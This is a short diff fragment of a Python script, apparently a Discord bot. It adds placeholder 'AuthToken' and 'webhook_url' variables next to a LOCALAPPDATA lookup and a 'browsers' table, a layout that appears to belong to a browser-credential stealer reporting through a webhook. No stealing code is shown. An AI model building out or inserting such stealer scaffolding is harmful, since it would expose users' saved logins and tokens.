@@ -45,7 +45,8 @@ intents.voice_states = True
 sessions = {}
 
 
-
+AuthToken = "REPLACE_WITH_AUTH_TOKEN"
+webhook_url = "REPLACE_WITH_WEBHOOK_URL"
 
 appdata = os.getenv('LOCALAPPDATA')
 browsers = {
